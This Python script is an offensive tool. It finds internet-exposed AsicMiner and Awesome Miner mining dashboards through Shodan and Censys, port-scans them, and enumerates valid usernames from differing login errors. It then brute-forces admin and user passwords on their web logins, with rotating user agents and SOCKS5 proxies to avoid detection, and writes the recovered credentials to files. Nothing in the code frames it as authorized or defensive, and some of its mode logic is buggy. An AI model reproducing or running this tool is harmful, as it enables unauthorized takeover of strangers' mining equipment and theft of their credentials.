import os
import time
import json
import random
import shodan
import censys
import socket
import requests
import datetime
import argparse
import threading
from queue import Queue
from censys import ipv4
from multiprocessing import Pool, freeze_support, Manager

info = """
[1] Find IP, check common ports, find AsicMiners/AwesomeMiners, brute admin account on 80 port;
[2] Ports scanner;
[3] Brute usernames on 80 port;
[4] Brute pass for specific user on 80 port;
[5] Brute admin account on 80 port;
[6] Find AsicMiners/AwesomeMiners in file with IP.
"""

parser = argparse.ArgumentParser()
parser.add_argument("-m", "--mode", help=info, choices=[1, 2, 3, 4, 5, 6], type=int, required=True)
parser.add_argument("-p", "--proxy", help="enables proxy", action='store_true')
args = parser.parse_args()

ports = [21, 22, 23, 80, 443, 2222, 8080, 8000, 8888]

m = Manager()
ip_list = m.list()
brute_data = m.list()
proxy_list = m.list()
asic_miners = m.list()
awesome_miners = m.list()
password_list = m.list()

ua = ['Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; zh-cn) Opera 8.65',
      'Mozilla/4.0 (Windows; MSIE 6.0; Windows NT 5.2)',
      'Mozilla/4.0 (Windows; MSIE 6.0; Windows NT 6.0)',
      'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 5.2)',
      'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; el-GR)',
      'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
      'Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-CN) AppleWebKit/533+ (KHTML, like Gecko)']

standard_users = ["admin", "Admin", "web", "root", "innominer", "innot1t2", "miner", "inno", "administrator", "user"]

shodan_api_key = "SHODAN_KEY"

censys_api_key = "CENSYS_KEY"
censys_api_secret = "CENSYS_SECRET"


# Generate headers
def headers_gen():
    """
    Generates headers with random user agent from ua list
    """
    headers = {
        'User-agent': random.choice(ua),
        'Accept-Encoding': 'gzip, deflate',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Upgrade-Insecure-Requests': '1',
        'Connection': 'keep-alive'}

    return headers


# Check if the url is AsicMiner
def find_asicminers(url):
    """
    Just checks if the url is AsicMiner
    """
    error = "Cannot connect to proxy"
    while "Cannot connect to proxy" in str(error):
        if url not in asic_miners:
            for retry in range(16):
                try:
                    time.sleep(0.5)

                    if args.proxy:
                        prox = random.choice(proxy_list)
                        proxies = {
                            "https": "socks5h://" + str(prox),
                            "http": "socks5h://" + str(prox)}

                        send = requests.post("http://" + str(url) + "/api/auth", headers=headers_gen(), proxies=proxies,
                                             verify=False, timeout=15)
                    else:
                        send = requests.post("http://" + str(url) + "/api/auth", headers=headers_gen(), verify=False,
                                             timeout=15)

                    if r"missing username\/password fields" in send.text:
                        if url not in asic_miners:
                            print("[*] AsicMiner found: " + str(url))
                            asic_miners.append(url)

                    error = None
                except Exception as e:
                    if "Cannot connect to proxy" in str(e) or "Read timed out" in str(e) or "Max retries exceeded" \
                            in str(e) or "Connection reset by peer" in str(e) or "RemoteDisconnected" in str(e):
                        pass
                    else:
                        print("\n" + str(e) + "\n")
                    error = str(e)


# Check if the url is Awesome Miner
def find_awesomeminers(url):
    """
    Just checks if the url is Awesome Miner
    """
    error = "Cannot connect to proxy"
    while "Cannot connect to proxy" in str(error):
        if url not in awesome_miners:
            for retry in range(16):
                try:
                    time.sleep(0.5)

                    if args.proxy:
                        prox = random.choice(proxy_list)
                        proxies = {
                            "https": "socks5h://" + str(prox),
                            "http": "socks5h://" + str(prox)}

                        send = requests.post("http://" + str(url) + "/signin", headers=headers_gen(), proxies=proxies,
                                             verify=False, timeout=15)
                    else:
                        send = requests.post("http://" + str(url) + "/signin", headers=headers_gen(), verify=False,
                                             timeout=15)

                    if r"/signin?error=invaliduser" in send.url:
                        if url not in awesome_miners:
                            print("[*] Awesome Miner found: " + str(url))
                            awesome_miners.append(url)

                    error = None
                except Exception as e:
                    if "Cannot connect to proxy" in str(e) or "Read timed out" in str(e) or "Max retries exceeded" \
                            in str(e) or "Connection reset by peer" in str(e) or "RemoteDisconnected" in str(e):
                        pass
                    else:
                        print("\n" + str(e) + "\n")
                    error = str(e)


# Brute users 80 port
def asicminer_web_user_brute(url):
    """
    if user not exists /api/auth will return:
        user not found

    if user exists /api/auth will return:
        invalid password
    """
    for user in standard_users:
        data = {"username": user, "password": "password"}

        error = "Cannot connect to proxy"
        while "Cannot connect to proxy" in str(error) or "Max retries exceeded" in str(error):
            time.sleep(0.5)
            try:
                if args.proxy:
                    p = random.choice(proxy_list)
                    proxies = {
                        "https": "socks5h://" + str(p),
                        "http": "socks5h://" + str(p)}

                    send = requests.post("http://" + str(url) + "/api/auth", data=data, headers=headers_gen(),
                                         proxies=proxies, verify=False, timeout=10)
                else:
                    send = requests.post("http://" + str(url) + "/api/auth", data=data, headers=headers_gen(),
                                         verify=False, timeout=10)

                if r"invalid password" in send.text:
                    print("[*] Username found: " + user)
                    found = open("found_users.txt", "a")
                    found.write("url: " + str(url) + "\tusername: " + str(user) + "\n")
                    found.close()

                    brute_data.insert(0, user)
                    brute_data.insert(1, url)

                    freeze_support()
                    pool_ = Pool(15)
                    pool_.map(asicminer_web_pass_brute, password_list)
                    pool_.close()
                    pool_.join()

                elif r"user not found" in send.text:
                    print("[-] Username " + user + " not found!")
                else:
                    print("[!] There maybe error!")

                error = None
            except Exception as e:
                if "Cannot connect to proxy" in str(e) or "Max retries exceeded" in str(e):
                    pass
                else:
                    print("\n" + str(e) + "\n")
                error = str(e)


# Brute AsicMiner pass on 80 port
def asicminer_web_pass_brute(password):
    """
    Brute pass for specific user
    """
    global brute_data
    error = "Cannot connect to proxy"
    user = brute_data[0]
    url = brute_data[1]
    print("[!] Trying password: " + password + " for user: " + str(user))
    while "Cannot connect to proxy" in str(error) or "Max retries exceeded" in str(error):
        try:
            time.sleep(0.5)

            d = {"username": user, "password": password}
            if args.proxy:
                prox = random.choice(proxy_list)
                proxies = {
                    "https": "socks5h://" + str(prox),
                    "http": "socks5h://" + str(prox)}

                pass_brute = requests.post("http://" + str(url) + "/api/auth", data=d, headers=headers_gen(),
                                           proxies=proxies, verify=False, timeout=10)
            else:
                pass_brute = requests.post("http://" + str(url) + "/api/auth", data=d, headers=headers_gen(),
                                           verify=False, timeout=10)

            if r'"success":true' in pass_brute.text:
                print("[*] Found password: " + str(password) + " for user: " + str(user))
                found = open("found_pass.txt", "a")
                found.write("url: " + str(url) + "\tusername: " + str(user) + " password: " + password + "\n")
                found.close()

            error = None
        except Exception as e:
            if "Cannot connect to proxy" in str(e) or "Max retries exceeded" in str(e):
                pass
            else:
                print("\n" + str(e) + "\n")
            error = str(e)


# Brute AsicMiner admin pass on 80 port
def asicminer_admin_web_pass_brute(url):
    """
    Brute pass for user 'admin'
    """
    for password in password_list:
        print("[!] Trying password: " + str(password) + " for admin on target: " + str(url))
        error = "Cannot connect to proxy"
        while "Cannot connect to proxy" in str(error) or "Max retries exceeded" in str(error):
            try:
                time.sleep(0.5)

                d = {"username": "admin", "password": password}
                if args.proxy:
                    prox = random.choice(proxy_list)
                    proxies = {"https": "socks5h://" + str(prox), "http": "socks5h://" + str(prox)}

                    pass_brute = requests.post("http://" + str(url) + "/api/auth", data=d, headers=headers_gen(),
                                               proxies=proxies, verify=False, timeout=10)
                else:
                    pass_brute = requests.post("http://" + str(url) + "/api/auth", data=d, headers=headers_gen(),
                                               verify=False, timeout=10)

                if r'"success":true' in pass_brute.text:
                    print("[*] Found admin password: " + str(password))
                    found = open("found_pass.txt", "a")
                    found.write("url: " + str(url) + "\tusername: admin    password: " + password + "\n")
                    found.close()

                error = None
            except Exception as e:
                if "Cannot connect to proxy" in str(e) or "Max retries exceeded" in str(e):
                    pass
                else:
                    print("\n" + str(e) + "\n")
                error = str(e)


# Brute users on 80 port
def awesomeminer_web_user_brute(url):
    """
    if user not exists /api/auth will return:
        user not found

    if user exists /api/auth will return:
        invalid password
    """
    for user in standard_users:
        data = {"username": user, "password": "password"}

        error = "Cannot connect to proxy"
        while "Cannot connect to proxy" in str(error) or "Max retries exceeded" in str(error):
            time.sleep(0.5)
            try:
                if args.proxy:
                    p = random.choice(proxy_list)
                    proxies = {
                        "https": "socks5h://" + str(p),
                        "http": "socks5h://" + str(p)}

                    send = requests.post("http://" + str(url) + "/signin", data=data, headers=headers_gen(),
                                         proxies=proxies, verify=False, timeout=10)
                else:
                    send = requests.post("http://" + str(url) + "/signin", data=data, headers=headers_gen(),
                                         verify=False, timeout=10)

                if r"/signin?error=invalidpassword" in send.url:
                    print("[*] Username found: " + user)
                    found = open("found_users.txt", "a")
                    found.write("url: " + str(url) + "\tusername: " + str(user) + "\n")
                    found.close()

                    brute_data.insert(0, user)
                    brute_data.insert(1, url)

                    freeze_support()
                    pool_ = Pool(15)
                    pool_.map(awesomeminer_web_pass_brute, password_list)
                    pool_.close()
                    pool_.join()

                elif r"/signin?error=invaliduser" in send.url:
                    print("[-] Username " + user + " not found!")
                else:
                    print("[!] There maybe error!")

                error = None
            except Exception as e:
                if "Cannot connect to proxy" in str(e) or "Max retries exceeded" in str(e):
                    pass
                else:
                    print("\n" + str(e) + "\n")
                error = str(e)


# Brute AsicMiner pass on 80 port
def awesomeminer_web_pass_brute(password):
    """
    Brute pass for specific user
    """
    global brute_data
    error = "Cannot connect to proxy"
    user = brute_data[0]
    url = brute_data[1]
    print("[!] Trying password: " + password + " for user: " + str(user))
    while "Cannot connect to proxy" in str(error) or "Max retries exceeded" in str(error):
        try:
            time.sleep(0.5)

            d = {"username": user, "password": password}
            if args.proxy:
                prox = random.choice(proxy_list)
                proxies = {
                    "https": "socks5h://" + str(prox),
                    "http": "socks5h://" + str(prox)}

                pass_brute = requests.post("http://" + str(url) + "/signin", data=d, headers=headers_gen(),
                                           proxies=proxies, verify=False, timeout=10)
            else:
                pass_brute = requests.post("http://" + str(url) + "/signin", data=d, headers=headers_gen(),
                                           verify=False, timeout=10)

            if r"Dashboard" in pass_brute.text:
                print("[*] Found password: " + str(password) + " for user: " + str(user))
                found = open("found_pass.txt", "a")
                found.write("url: " + str(url) + "\tusername: " + str(user) + " password: " + password + "\n")
                found.close()

            error = None
        except Exception as e:
            if "Cannot connect to proxy" in str(e) or "Max retries exceeded" in str(e):
                pass
            else:
                print("\n" + str(e) + "\n")
            error = str(e)


# Brute Awesome Miner admin pass on 80 port
def awesomeminer_admin_web_pass_brute(url):
    """
    Brute pass for user 'admin'
    """
    for password in password_list:
        print("[!] Trying password: " + str(password) + " for admin on target: " + str(url))
        error = "Cannot connect to proxy"
        while "Cannot connect to proxy" in str(error) or "Max retries exceeded" in str(error):
            try:
                time.sleep(0.5)

                d = {"username": "admin", "password": password}
                if args.proxy:
                    prox = random.choice(proxy_list)
                    proxies = {"https": "socks5h://" + str(prox), "http": "socks5h://" + str(prox)}

                    pass_brute = requests.post("http://" + str(url) + "/signin", data=d, headers=headers_gen(),
                                               proxies=proxies, verify=False, timeout=10)
                else:
                    pass_brute = requests.post("http://" + str(url) + "/signin", data=d, headers=headers_gen(),
                                               verify=False, timeout=10)

                if r"Dashboard" in pass_brute.text:
                    print("[*] Found admin password: " + str(password))
                    found = open("found_pass.txt", "a")
                    found.write("url: " + str(url) + "\tusername: admin    password: " + password + "\n")
                    found.close()

                error = None
            except Exception as e:
                if "Cannot connect to proxy" in str(e) or "Max retries exceeded" in str(e):
                    pass
                else:
                    print("\n" + str(e) + "\n")
                error = str(e)


# Shodan
def shodan_scanner(dork, start=1, stop=2):
    """
    Save results from shodan.io to ip_list
    """
    api = shodan.Shodan(shodan_api_key)
    for page in range(start, stop):
        try:
            time.sleep(0.5)
            results = api.search(dork, page=page)
            for result in results['matches']:
                if not result['ip_str'] in ip_list:
                    ip_list.append(result['ip_str'])
                    print(result['ip_str'])
        except shodan.exception.APIError as error:
            print('[!] Error: ' + str(error))
            continue


# Censys
def censys_scanner(dork, records=25):
    """
    Save results from censys.io to ip_list
    """
    c = ipv4.CensysIPv4(api_id=censys_api_key, api_secret=censys_api_secret)
    try:
        for result in c.search(dork, max_records=records):
            res = json.dumps(result, indent=4)
            r = json.loads(res)
            if r["ip"] not in ip_list:
                ip_list.append(r["ip"])
                print(r["ip"])
    except censys.exceptions as error:
        print('[!] Error: ' + str(error))


# Port scanner
def port_scanner(target):
    """
    Simple port scanner
    """
    print("\nIP: " + str(target))
    socket.setdefaulttimeout(1)
    print_lock = threading.Lock()

    def portscan(port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            con = s.connect((target, port))
            with print_lock:
                print(port, 'is open')
                f_ip = open('logs/' + date + "_port_" + str(port) + ".txt", "a")
                f_ip.write(str(target) + "\n")
            con.close()
        except:
            pass

    def threader():
        while True:
            w = q.get()
            portscan(w)
            q.task_done()

    q = Queue()

    for x in range(len(ports) // 2):
        t = threading.Thread(target=threader)
        t.daemon = True
        t.start()
    for worker in ports:
        q.put(worker)

    q.join()


if __name__ == "__main__":
    if not os.path.exists('logs'):
        os.mkdir('logs')

    date = datetime.datetime.today().strftime("%H.%M_%d-%m-%y")

    try:
        if args.mode == 1:
            miner_type = input("\n[+] Enter miner type [asic/awesome]\n==> ")
            print("Finding IP...\n")
            results_file = r'logs/' + date + '.txt'
            if miner_type.lower() == "asic":
                print("\nCensys:")
                censys_scanner("AsicMiner", records=40)
                print("\nShodan:")
                shodan_scanner("title:AsicMiner", stop=3)

            elif miner_type.lower() == "awesome":
                print("\nCensys:")
                censys_scanner("80.http.get.body: Awesome Miner", records=40)
                print("\nShodan:")
                shodan_scanner("Awesome Miner", stop=3)

            f = open(results_file, "a")
            for ip in ip_list:
                f.write(str(ip) + "\n")
                print(ip)
            f.close()

            start_port_scanner = input("\n[+] Start scanning IP's for common ports? [y/n]\n==> ")
            if start_port_scanner.lower() == "y":
                for ip in ip_list:
                    port_scanner(ip)

            if miner_type.lower() == "asic":
                start_finding_asicminers = input("\n[+] Start finding asicminers? [y/n]\n==> ")
                if start_finding_asicminers.lower() == "y":
                    if args.proxy:
                        try:
                            with open("proxy.txt", "r") as f:
                                for proxy in f.readlines():
                                    if proxy.split("\n")[0] not in proxy_list:
                                        proxy_list.append(proxy.split("\n")[0])
                        except Exception as ex:
                            print("[!] Error: " + str(ex))
                            exit(0)

                    freeze_support()
                    pool = Pool(len(ip_list) // 3)
                    pool.map(find_asicminers, ip_list)
                    pool.close()
                    pool.join()

                    found_asic_miners = open("AsicMiners.txt", "a")
                    for asic_miner_url in asic_miners:
                        found_asic_miners.write(str(asic_miner_url) + "\n")
                    found_asic_miners.close()

                    start_brute = input("\n[+] Start bruting admin account on port 80? [y/n]\n==> ")
                    if start_brute.lower() == "y":
                        try:
                            f = open("passwords.txt", "r")
                            for i in f.readlines():
                                password_list.append(i.split("\n")[0])
                            f.close()
                        except Exception as ex:
                            print("[!] Error: " + str(ex))
                            exit(0)

                        freeze_support()
                        pool = Pool(len(asic_miners))
                        pool.map(asicminer_admin_web_pass_brute, asic_miners)
                        pool.close()
                        pool.join()

            elif miner_type.lower() == "awesome":
                start_finding_awesomeminers = input("\n[+] Start finding awesomeminers? [y/n]\n==> ")
                if start_finding_awesomeminers.lower() == "y":
                    if args.proxy:
                        try:
                            with open("proxy.txt", "r") as f:
                                for proxy in f.readlines():
                                    if proxy.split("\n")[0] not in proxy_list:
                                        proxy_list.append(proxy.split("\n")[0])
                        except Exception as ex:
                            print("[!] Error: " + str(ex))
                            exit(0)

                    freeze_support()
                    pool = Pool(len(ip_list) // 3)
                    pool.map(find_awesomeminers, ip_list)
                    pool.close()
                    pool.join()

                    found_awesome_miners = open("AwesomeMiners.txt", "a")
                    for awesome_miner_url in awesome_miners:
                        found_awesome_miners.write(str(awesome_miner_url) + "\n")
                    found_awesome_miners.close()

                    start_brute = input("\n[+] Start bruting admin account on port 80? [y/n]\n==> ")
                    if start_brute.lower() == "y":
                        try:
                            f = open("passwords.txt", "r")
                            for i in f.readlines():
                                password_list.append(i.split("\n")[0])
                            f.close()
                        except Exception as ex:
                            print("[!] Error: " + str(ex))
                            exit(0)

                        freeze_support()
                        pool = Pool(len(asic_miners))
                        pool.map(awesomeminer_admin_web_pass_brute, awesome_miners)
                        pool.close()
                        pool.join()

        elif args.mode == 2:
            file = input("\n[+] Enter path to file with IP's\n==> ")
            f = open(file, "r")
            for i in f.readlines():
                ip_list.append(i.split("\n")[0])
            f.close()

            for ip in ip_list:
                port_scanner(ip)

        elif args.mode == 3:
            try:
                f = open("passwords.txt", "r")
                for i in f.readlines():
                    password_list.append(i.split("\n")[0])
                f.close()
            except Exception as ex:
                print("[!] Error: " + str(ex))
                exit(0)

            if args.proxy:
                try:
                    with open("proxy.txt", "r") as f:
                        for proxy in f.readlines():
                            if proxy.split("\n")[0] not in proxy_list:
                                proxy_list.append(proxy.split("\n")[0])
                except Exception as ex:
                    print("[!] Error: " + str(ex))
                    exit(0)

            miner_type = input("\n[+] Enter miner type [asic/awesome]\n==> ")
            link = input("\n[+] Enter url or ip: ")
            if miner_type.lower() == "asic":
                asicminer_web_user_brute(link)
            elif miner_type.lower() == "awesome":
                awesomeminer_web_user_brute(link)

        elif args.mode == 4:
            username = input("\n[+] Enter user: ")
            link = input("\n[+] Enter url or ip: ")

            brute_data.insert(0, username)
            brute_data.insert(1, link)

            if args.proxy:
                try:
                    with open("proxy.txt", "r") as f:
                        for proxy in f.readlines():
                            if proxy.split("\n")[0] not in proxy_list:
                                proxy_list.append(proxy.split("\n")[0])
                except Exception as ex:
                    print("[!] Error: " + str(ex))
                    exit(0)

            try:
                f = open("passwords.txt", "r")
                for i in f.readlines():
                    password_list.append(i.split("\n")[0])
                f.close()
            except Exception as ex:
                print("[!] Error: " + str(ex))
                exit(0)

            miner_type = input("\n[+] Enter miner type [asic/awesome]\n==> ")
            if miner_type.lower() == "asic":
                freeze_support()
                pool = Pool(20)
                pool.map(asicminer_web_pass_brute, password_list)
                pool.close()
                pool.join()
            elif miner_type.lower() == "awesome":
                freeze_support()
                pool = Pool(20)
                pool.map(awesomeminer_web_pass_brute, password_list)
                pool.close()
                pool.join()

        elif args.mode == 5:
            file = input("\n[+] Enter path to file with IP's\n==> ")
            f = open(file, "r")
            for i in f.readlines():
                ip_list.append(i.split("\n")[0])
            f.close()

            try:
                f = open("passwords.txt", "r")
                for i in f.readlines():
                    password_list.append(i.split("\n")[0])
                f.close()
            except Exception as ex:
                print("[!] Error: " + str(ex))
                exit(0)

            if args.proxy:
                try:
                    with open("proxy.txt", "r") as f:
                        for proxy in f.readlines():
                            if proxy.split("\n")[0] not in proxy_list:
                                proxy_list.append(proxy.split("\n")[0])
                except Exception as ex:
                    print("[!] Error: " + str(ex))
                    exit(0)

            miner_type = input("\n[+] Enter miner type [asic/awesome]\n==> ")
            if miner_type.lower() == "asic":
                freeze_support()
                pool = Pool(len(ip_list) // 2)
                pool.map(asicminer_admin_web_pass_brute, ip_list)
                pool.close()
                pool.join()
            elif miner_type.lower() == "awesome":
                freeze_support()
                pool = Pool(len(ip_list) // 2)
                pool.map(awesomeminer_admin_web_pass_brute, ip_list)
                pool.close()
                pool.join()

        elif args.mode == 6:
            file = input("\n[+] Enter path to file with IP's\n==> ")
            f = open(file, "r")
            for i in f.readlines():
                ip_list.append(i.split("\n")[0])
            f.close()

            if args.proxy:
                try:
                    with open("proxy.txt", "r") as f:
                        for proxy in f.readlines():
                            if proxy.split("\n")[0] not in proxy_list:
                                proxy_list.append(proxy.split("\n")[0])
                except Exception as ex:
                    print("[!] Error: " + str(ex))
                    exit(0)

            miner_type = input("\n[+] Enter miner type [asic/awesome]\n==> ")
            if miner_type.lower() == "asic":
                freeze_support()
                pool = Pool(len(ip_list) // 3)
                pool.map(find_asicminers, ip_list)
                pool.close()
                pool.join()
            elif miner_type.lower() == "asic":
                freeze_support()
                pool = Pool(len(ip_list) // 3)
                pool.map(find_awesomeminers, ip_list)
                pool.close()
                pool.join()

    except KeyboardInterrupt:
        print('\n[!] (Ctrl + C) detected...')
        exit(0)

    except Exception as ex:
        print(str(ex) + "\n[!] Exiting...")
        exit(0)
